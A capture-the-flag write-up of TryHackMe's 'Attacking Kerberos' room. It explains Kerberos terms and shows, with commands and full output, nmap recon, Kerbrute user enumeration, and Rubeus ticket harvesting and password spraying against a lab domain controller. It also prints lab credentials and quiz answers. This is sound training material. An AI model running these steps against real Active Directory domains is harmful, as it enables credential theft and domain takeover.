# TryHackMe's Attacking Kerberos Lab Write-up
>Written by Herman Detwiler | 8/2/2021

*Learning how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller*

### Table of Contents
- [Introduction](#Introduction)
- [RECON](#RECON)
- [Enumeration with Kerbrute](#Enumeration-with-Kerbrute)
- [Harvesting and Brute-Forcing Tickets with Rubeus](#Harvesting-and-Brute-Forcing-Tickets-with-Rubeus)
- [Kerberoasting with Rubeus and Impacket](#Kerberoasting-with-Rubeus-and-Impacket)
- [AS-REP Roasting with Rubeus](#AS-REP-ROASTING-with-Rubeus)
- [Pass the Ticket with mimikatz](#Pass-the-Ticket-with-mimikatz)
- [Golden and Silver Ticket attacks with mimikatz](#Golden-and-Silver-Ticket-Attacks-with-Mimikatz)
- [Kereros Backdoors with Mimikatz](#Kerberos-Backdoors-with-Mimikatz)
- [Conclusion](#Conclusion)

Introduction
======================================================================================================
This lab will cover the basics of attacking Kerberos, the windows ticket-granting service.

This Lab Covers

- Initial enumeration using tools like Kerbrute and Rubeus
- Kerberoasting
- AS-REP Roasting with Rubeus and impacket
- Golden and Silver Ticket Attacks
- Pass the Ticket
- Skeleton key attacks using mimikatz

This room is related to real-world applications and is a starting point for learning how to escalate privileges to that of a domain admin by attacking Kerberos and taking control of a network.

It is recommended to have a general knowledge of post-exploitation, active directory, and the windows command line.

## What is Kerberos

Kerberos is the deault authentication service for Microsoft Windows domains. It is meant to be more secure than NTLM by using third part ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

### Common Terminology

- **TGT** *Ticket Granting Ticket* : A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.

- **KDC** *Key Distribution Center* : The key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.

- **AS** *Authentication Service* : The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.

- **TGS** *Ticket Granting Service* : The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.

- **SPN** *Service Principal Name* : A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SON set.

- **KDC LT Key** *Key Distribution Center Long Term Key* : The KDC key is based on the KRBTGT service account.  It is used to encrypt the TGT and sign the PAC

- **Client LT Key** *Client Long Term Key* : The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.

- **Service LT Key** *Service Long Term Secret Key* : The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.

- **Session Key** issued by the KDC when a TGT is issued.The user will provide the session key to the KDC along with the TGT when requesting a service ticket

- **PAC** *Privilege Attribute Certificate* The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

### **AS-REQ** with Pre-Authentication in Detail

The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps.

1. user encrypts a timestamp NT hash and sends it to the AS
2. The KDC attempts to decrypt the timestamp using the NT hash from the user, 
3. If successful the KDC will issue a TGT and a session key for the user.

### Ticket Granting Ticket Contents

In order to understand how the service tickets get created and validated, we need to start with where the tickets comes from: the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

Example TGT
---

***Encrypted using KDC LT Key***
- Stat/End/Max Renew: 10/31/2021: 1:36; 10/31/2021: 11:36.....
- Service Name: krbtgt: example.local
- Target Name: krbtgt: example.local
- Client Name: user; example.local
- Flages: ooeoooooo
- Session key: ooooxooooooo 12ev21212....

Privilege Attribute Certificate
- Username: example
- SID: S-o-5-45.......

[x] Signed with Service LT key

[x] Signed with KDC LT key

---

<img src="https://upload.wikimedia.org/wikipedia/commons/2/26/TGTplay.gif" />

### Service Ticket Contents
Contains two parts

1. **Service Portion**
: User Details, Session Key, Encrypts the ticket with the service account NTLM hash

2. **User Portion**
: Validity Timestamp, Session Key, Encrypts with the TGT session key.

### Kerberos Authentication Overview
- AS-REQ*uest*-1. The client requests an Authentication Ticket or Ticket Granting Ticket *TGT*
- AS-REP*ly*   2. The Key Distribution Center verifies the client and sends back an encrypted TGT
- TGT-REQ*uest*3. The client send the encrypted TGT to the ticket Granting Server with the SPN or the service the client wants to access
- TGS-REP*ly*  4. The Key Distribution Center KDC verifies the TGT of the user and that the user has access to the servicem then sends a valid session key for the service to the client
- AP-REQ*uest* 5. The client requests the service and sends the valid session key to prove the user has access
- Ap-REP*ly*   6. The service grants access.

### Kerberos Tickest Overview

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

### Attack Privilege Requirements

- **Kerbrute Enumeration** - No domain access required 
- **Pass the Ticket** - Access as a user to the domain required
- **Kerberoasting** - Access as any user required
- **AS-REP Roasting** - Access as any user required
- **Golden Ticket** - Full domain compromise (domain admin) required 
- **Silver Ticket** - Service hash required 
- **Skeleton Key** - Full domain compromise (domain admin) required



RECON
======================================================================================================

### Nmap Results
**Open Ports**

```nmap
Discovered open port 22/tcp on 10.10.53.187
Discovered open port 445/tcp on 10.10.53.187
Discovered open port 3389/tcp on 10.10.53.187
Discovered open port 135/tcp on 10.10.53.187
Discovered open port 53/tcp on 10.10.53.187
Discovered open port 139/tcp on 10.10.53.187
Discovered open port 88/tcp on 10.10.53.187
Discovered open port 593/tcp on 10.10.53.187
Discovered open port 3269/tcp on 10.10.53.187
Discovered open port 3268/tcp on 10.10.53.187
Discovered open port 464/tcp on 10.10.53.187
Discovered open port 389/tcp on 10.10.53.187
Discovered open port 636/tcp on 10.10.53.187
```

**Discovered Services**

```python
PORT     STATE SERVICE       REASON  VERSION
22/tcp   open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:f2:8b:17:15:7c:90:d7:4e:0f:8e:d1:4c:6a:be:98 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBYAa9AZBsEOwCK/28ymk+6ZkIdxdK3dfRnFaUZHlSqUgdz5Fjn/wyUeuAChlOvF6yjcGtcqvx62/Cw8ngaubb9B7QYt8XWGy4aFRL/IYX0O7MiEJQ6YIPGYKQSOs2m/F07FrQPLnzytQ3oh0Gkl6zpOEGtcPYa8BtFj6vpdVthaDipnm4TetegdwUAeRpq1m9chBWONPfU0syMn2TuA8jw+sFIkOCE+x+ylOjHeJ63ncdvrvPeUSkwD//qeOg6JdwaDk3jdtuKxphxkczsc2VvU/OeJ8wW7MMQy2nO1JZTCtrWlms8d2+j1V8pR+fhLIuKu+JpwbLqgr5jieB1CIl
|   256 b0:3a:a7:c3:88:2e:c1:0b:d7:be:1e:43:1c:f7:5b:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCGER+LQSfN21aCiK2J5UoJ7elNly98IB2TIQejTa/vdve8vfzhOcZNkdmCRcwcfqvmMM7eScuhnyuV2l34lDoE=
|   256 03:c0:ee:58:32:ae:6a:cc:8e:1a:7d:8b:20:c8:a2:bb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBkJkzX/eHfebkreDRkbu0WtQB1EnQtRuYvx3rooVnqm
53/tcp   open  domain        syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-08-04 15:23:20Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CONTROLLER
|   NetBIOS_Domain_Name: CONTROLLER
|   NetBIOS_Computer_Name: CONTROLLER-1
|   DNS_Domain_Name: CONTROLLER.local
|   DNS_Computer_Name: CONTROLLER-1.CONTROLLER.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-08-04T15:23:25+00:00
| ssl-cert: Subject: commonName=CONTROLLER-1.CONTROLLER.local
| Issuer: commonName=CONTROLLER-1.CONTROLLER.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-08-03T14:13:31
| Not valid after:  2022-02-02T14:13:31
| MD5:   1499 5129 24fd 6dfb be1f 25ee 7b35 65c6
| SHA-1: ae7c 317e 71af 89ff aa43 8034 359e 0f86 5e6d d48f
| -----BEGIN CERTIFICATE-----
| MIIC/jCCAeagAwIBAgIQcPG6j9NR2YhKWwJpr8KG9jANBgkqhkiG9w0BAQsFADAo
| MSYwJAYDVQQDEx1DT05UUk9MTEVSLTEuQ09OVFJPTExFUi5sb2NhbDAeFw0yMTA4
| MDMxNDEzMzFaFw0yMjAyMDIxNDEzMzFaMCgxJjAkBgNVBAMTHUNPTlRST0xMRVIt
| MS5DT05UUk9MTEVSLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEApFFetGqSDkwTeVJBnSTxkQL14FkgXghpTsBwW5ehPS00BoxDeUs5To6enRbO
| eeDtZqpT6YVYaOaZrNO7MVVO0DmnFU+0CNwv7U3wRDnZ3IBT0xI/NUWmenTgWVAa
| 8eRI/Bo4s8sdnIZeMJhkoEeNP1lHvW8PJ+U1sJlkQ+rIsqzl0hY4i3bPrT+TbXNr
| DTrcozggyelQA6QuVRBMAZv0tx9CO5Qy4/fHIMxeWnQ/HMnGJGFHLUNsvQo//fz4
| 93FiW4pEN3g7cCOotbBoJ2SittHBnz2UzPCVya2LLgwZSMC20Xf1RRPvlUDlX4Y5
| OVLJiebrh1bLivonZN+Yj68lvQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAABP909fAz29d4/waYXv
| NUpEFr059pKNhP8H5G8S9HHx7AWulaK1v9oD9YTwj7WXvWnbnV4jXdJ/t5Buc20N
| wxypAICiiWo+TNoVrdI3T4VAbv4oE0HOkV8A0hKbO8WB3o/GJdtfGajxbKgSdng+
| vczPpXsAzkET43w47mIedbOWncEHO+ZQXI9lSiawkJ6Q5w7bBfm42c2Fpc7Qnehr
| a0GXOZy37nKQ/Z8sX3sqbcfhzcFubvBEVv5TPtTLacg6MTYNnmQypBT1Zd7HrdK5
| IpEkrWoobWwABVEIFaTnoAufJ+UEwIEgr2Hs2f/Ef4q/H32Lb0kjEfGl1pB4On4N
| 6ag=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-08-04T15:23:34+00:00; +1s from scanner time.
Service Info: Host: CONTROLLER-1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 63676/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 35663/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 15536/udp): CLEAN (Timeout)
|   Check 4 (port 49690/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-04T15:23:26
|_  start_date: N/A

```
Enumeration with Kerbrute
=============================================================================================================================================

### Overview

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.


For this lab you need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - 10.10.53.187  CONTROLLER.local

### Git addr

`https://github.com/ropnop/kerbrute/releases`

### Usage

```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local usernames.txt
```

`./kerbrute` Execute kerbrute 

`userenum` In user enumeration mode

`--dc CONTROLLER.local` To domain controller named "CONTROLLER.local" 

`-d CONTROLLER.local` To the domain with the same name (in this case)

`usernames.txt` and use our supplied list of possible usernames.

### Kerbrute Results

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/04/21 - Ronnie Flathers @ropnop

2021/08/04 11:53:54 >  Using KDC(s):
2021/08/04 11:53:54 >   CONTROLLER.local:88

2021/08/04 11:53:54 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2021/08/04 11:53:54 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2021/08/04 11:53:54 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2021/08/04 11:53:55 >  Done! Tested 100 usernames (10 valid) in 0.852 seconds
```
### Questions


1. How many total users do we enumerate?
: 10

2. What is the SQL service account name?
: sqlservice

3. What is the second "machine" account name?
: machine2

4. What is the third "user" account name?
: user3

Harvesting and Brute-Forcing Tickets with Rubeus
=============================================================================================================================================

Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - https://github.com/GhostPack/Rubeus

*To start this task you will need to RDP or SSH into the machine your credentials are*
:

Username: `Administrator` 

Password: `P@$$W0rd` 

Domain: `controller.local`

Machine IP is `10.10.53.187`    

### Harvesting Tickets

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

Rubeus is already compiled and on the target machine and cab be found in the Downloads folder.

**USAGE**
: `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds

```
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  
                                         
  v1.5.0                                 

[*] Action: TGT Harvesting (with auto-renewal) 
[*] Monitoring every 30 seconds for new TGTs          
[*] Displaying the working TGT cache every 30 seconds 


[*] Refreshing TGT ticket cache (8/4/2021 12:08:18 PM) 

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL                                                
  StartTime             :  8/4/2021 11:58:41 AM                                                          
  EndTime               :  8/4/2021 9:58:41 PM                                                           
  RenewTill             :  8/11/2021 11:58:41 AM                                                         
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable               
  Base64EncodedTicket   :                                                                                
                                                                                                         
    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr 
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEiF2tQH5uEhFbFkJRJcrdqXoZ/tOuG3st4m9 
    /PkKNx4dUxygzhMq7VnimLy2rxr/cb/ZPd+eGWujsKLlHzCg4Ty0MWcDRTx1ewdtU0aFAEdX6nNsX8pMCpAGdlk+pZk2fxcsw1kS 
    pOqfAeouD2CPHxxZwBGlkGVtoirgwSFwkpR9aNYa7+YwNjGhjjZPZc8A+Sy3TQHrhB2NeMhl0QV1iweAnL7xsLH+6D3Dg/sPDPf1 
    mSja2xmXdnV/Uu6oKipg6j1gUSdKrYF2mP3fFccNvQ8CSRN9kLTbd97YY13RhiFnffNYeYrGv40BTi0ymWhP0CUzogetAcW60bhv 
    +aPW4ifOo+OUUiL7BPqwB0ZJ5k7ghF3InLzPSyWiQxYZwGkiGnIG1LYKoSKa2jmzlHDF8OR8mejAcRXja4Wu9WzNu1bhbO9i4Xa/ 
    poZ94M02Tqfp6bYRhZuryYAMo8c0J43i2/l3AfYW2n0XU9mIQEGj4U/mcFhUy8mro2J8tGZXymNyfx/zV56cAW14kkSAoOZZvTuf 
    kmUSJ0GyvsOnIg37SbSI1GZ9ILod3hTXgIIpTOkcr0mUvZ7+LhYqvVVekZ8QB5pHzkd6dlh+ZMKxQjyo8IB83KBl21yGGSJXf6Fv 
    t5UKmOdbUGTogItMtZNTz7WjOb+krKAeQzgqEBdGTye0EfqyXUkWMe9cy3qL5AAHCLKogQ7jBNFryzuXtnB2CMhsuRtC9JvPBu75 
    JlAnTitprvDTuNYuPO0fimCifztDntGpkOODyMhcB9OAwsifLT4Rq/8EzTk6ij7y3+bjQMFWUjT0Bwn5haRnKVEZLkZSqEwLSBYe 
    fBR3xSiwmbJub2OKgTlS2lOhw+jM+VJ0zuVqjz6P0FxNWxTgSOI090Sy80h5Nq4rZPVOFcuQt3OYDrJXw0HqekXiijMknS8NsEgR 
    SrBWr7UjvkxM+JDeBKknPLgKvMkrD24jqPIF48EhaOAVZe3S0prWCEOZZRWPZDcuZOD0eXCkc5nxFatX+3oO6fT0kuh2s4eRFrqh 
    sjG011r/UErjcU7N5jzPu+qWvUCcv2Sd0xhDA6/ygyZLffCAqnjKKB4Ie7P8Tk9ejwfEdKoBhKAiOWFEy8F7R7CbGPcoCjWARzvu 
    HtzpT/m5JPQBaQkhTqOF8IVkKYMuR1ufkvLUxZlSkPxwavICiam552AyiMObw3dTdZfhqSrKNCPvsXRSbp8KYH6T4u6bBjc6LqHY 
    cSceZdGQ8OPQFN0hkvsJYs3OjW8O2DHfDr3yQuIMsQWdYHdYtkMd20BiLtz18O0kdUltKwXfZynL7whCABZM/rqWMzIDV7HEg20y 
    MVSjjhpTwkmEVG9nZVv3GyOxLn3cde4GCyX3HcVPnFwUpfqS5KvwrAKjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr 
    MCmgAwIBEqEiBCDy9dPozcZuNE83V43G4PI77d2lH7k3FbnpB4R1nSQepqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw 
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDgwNDE4NTg0MVqmERgPMjAyMTA4MDUwNDU4NDFapxEYDzIwMjEwODEx 
    MTg1ODQxWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM 
    
    User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  8/4/2021 12:00:14 PM
  EndTime               :  8/4/2021 10:00:14 PM
  RenewTill             :  8/11/2021 12:00:14 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :
  
    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGls9kQ/Yv3FJniSj3M/OKTagKGbS/FTdqIH6
    I0qCmjBq4j2qaS2htc8sYXjcDf/KHY26BQepXJhqbivW/ywjSa/Ui7aHE7cySOlGEzAEuFi3gnnyBJpFMAvngEDR61wnVSxO0pXE
    yw+N0tX8hwBLS+WCzmd150t3kDbVH/a3QKcZyQkOTR5elPeIe6wdk/k8U56esLdM8ln+MgeNhh9srLYc6/I8xw6O8NQfDOSSQi6I
    zGZU78QY5exMbjLrapo+M5h3l+byLJdzPIeqzPk4Wq7bc75hkQrrS+g3HgQm4e4rlZVy5X/Bqc3GpsbiMpkFichFvzThDvIjmhsR
    XfOCniXze7+8k4d9N5pF2uW9oJS9FMQDsXVIQBEv0foz3X9sLATbHXLgqd0XlBh7WvzTrxvp+2YR0gKMUapeSD+Zob3gRF1BgEvo
    Nk4R/S9X1T5AuqqkmPRj6M6KzmCkJKmtC7pmjo/mQ2ahunImVrf8+e/swVuN4Uq4HmH+sFyckNSvLNn/ldZaDwznhq0SrGnspFN7
    I3tibVC375j6S2T4MGg8PUv+JMGQM84PZBgVaRtZdpK7kMM+TuLZozZ/gInJVauQ11t+a2gJTvNX/ACl4PI/39e6kdfZeFp2B72K
    J2acwy9X3m49d4RAyVJMVOlNkAIYYmrS16Xc+JNHxkrAQfH7uyRFh5idZqpOyAQF+LTPH/bZfipWDzyrwpYap6M5bXNUTZlwTNhp
    AgE9RmZ+IrM16mHZMYTLrQi1c0/BSS4dOcvUZcqFfI7VkIrt+Qr4Rf6SmWRtjtKiLjF7pufozQUT9zKh81gZaethsE9XnnnnpndL
    lsEvzNQIejjC3TyNN7d6GQ90RdiRt/nTAd74+di4cGv4ezZTWt8xVLWdwRydyP6F0SpA47S2/0jH+5NsRVbLMEeQrUDXBphdZlss
    ha1mqgxihBlq8/ehed9UKHbe6SNowUeyQJuOr7wSIl5bl1dPxfLBmhqrl4dzy8AeX62uKRxl9+pcUQAOnNicqsPCDTJBc9AM/T/K
    phEaAn5CVSOvEBOld7PUan9Q34RzCp740xPB5nb3Mjq7QbGeUi/1U2CtO4+ygYiGsyihehegHNCSI6e11GVA9doxvV7ztt1aJ2Fv
    MA7yhpGqbr1b3Lkb0jN7Mf+M7tS93MI9xjhSL/wHrTmezWicLWIimiOQlvMKIT6C+0MmvQyF5ZgtlwirWYUTIyHgbqMmGZmiJgCY
    Xf5zAbHLEFCiW9MdrnWrETCnbHIBy58C2fb3Er1kbhZ57iyvsP6BGYH/YYLMyk/FnpyZG37Z2tiEQ4zXZCqB1m2PlQL90wkFq20k
    cK3PExzWAt4ucQZESOnQcmxFaagDj0RyJcHR2Adi196g5YKvrFnXRPvkfUDMFUpyeqOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
    MIHdMIHaoCswKaADAgESoSIEIGN2NRrt4LzVadN0FxZJCFrV55b86+sHle1GvKkJx+cYoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjEwODA0MTkwMDE0WqYRGA8yMDIxMDgwNTA1MDAxNFqnERgP
    MjAyMTA4MTExOTAwMTRaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=
    
```    
### Brute forcing and password spraying with Rubeus
    
   Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 

`echo 10.10.53.187 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

**USEAGE** 
: `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user. 

Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.

```
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticke
t

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7YHLo2VEVuyhkFD7gzN0e274jDt1ZVm/LtZigOXt2XerHMMAivRo6s6Ly2XCgQNoS8gajgFd/0yp
      lJhzL/SSWxIeOkGgfqReK0dT+UkZYdIe/5SCtCXx2YhKJ/SZCewjP1xKl3Mvq/ASD41KRkwZwEZQm0Uv
      s+rkNQqSFGIx2jKqNMAMZ4KII8iXJSApRCwbXM/YQLpEh4+dN1ZVkgiRxn9hJ3GBlH67XArKwOmbw5Bc
      +zJH97yEkPzu6b4UIOmzKS1H72cRwjNWvK8bwZzSQ9bPsBHuDsjHjs/7b+jSjT9oiYswzJ97mMY/MSpo
      1lC2/8JDM10weD9U4TGFQGJW39qhlkl/Hp8G+nbpY1LyibT4bvXsUGVeiwjl8u3tEQkAPED3pW7tPhJ0
      sUsiMU/zIadZgQu/2Am9IvrtK4PW6M62+Z9H0FIfrULf/60l0aqezrapn3SqRY8vli4oqTuLbfPv/enl
      ZaxPMR64wZrdL/r/VaCmIEnuuyQEFvDkrmA5wFajUynHovYyBcpmRoCUO3htQllLEP3mct2zVi8rSkOq
      3wap9Iu+iIudWYVsfMjXg+oJ40C5qI0V551FFJGb9INdmfQNSH2zAfAr4lb5yyGXuhPbisBj0mc9S+Mg
      AGKhlyheLF2Xn2EvHbfDESJq3VOukVvVsSLeYOOC6gOl8GZMV2LjqEgxK03/u5DTgkDfS0PtnhJIaVbZ
      FO37zSqWtieuKwH7GvbOG1lIWXKZxZpvt5Rw6Kjgg/9orFEaEUFNOj5UFkg8p/bVD051XUVJttUxg3S1
      4LLLvqPUDHOZ1V9O5erAFunSDT8FUdUHj7Q0uDtbeIu/nHIrHn1P2eTC1i0J3BUlAW8mQgBU06M34Ofo
      4ZqZr0Qpj4JoStg0+jtkSV1yVCSxOI4DG86DXcg9xitYR8XR0ngn12xXVya5GqoEre6a5QKcSeR5u7iU
      vWhGWnQ4JZHBjf5A+rVCnAQcbjYueGiHh8NxmoD/SLgK/UIOMZCcL4BsRkY/IzYvvJ8hWV2CE/uWKZr+
      IhUM+IFOFvt3jW9YfAhws0dlhFSBNFD8u0xmTPA8NrkuRRt11BMbkA81UqSqM+L1ZXalLR74X8EEwJOX
      qFAWLXHVATxifNduAabHEamBcBc9P1rKhzpENL2oWXOFKcLoIRjjWlI28BwDoOv/xWij3RKL44tVMH2Y
      fKj4NQhe9Ix2Pnc0C7M0dGgH/GlcF8T5xtXEIw4Lwo+Q2xe7ckdidFpcmLiBq3JyqIlgzYAheD5D5jo9
      y9YDLRXrZrCv9M8bNkrSuWEo+T46hS0+qVll4HLJHbpkOk42w3X/NVykNEDdUDe/46OB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIK/HXXigV28dS3EyPBaifLRmxZLY9MI8xdQY
      eb1Ti6a9oRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIxMDgwNDE5MTg1M1qmERgPMjAyMTA4MDUwNTE4NTNapxEYDzIwMjEwODExMTkxODUzWqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done
```
### Questions

1. Which domain admin do we get a ticket for when harvesting tickets?

Answer
: Administrator

2. Which domain controller do we get a ticket for when harvesting tickets?

Answer
: CONTROLLER-1


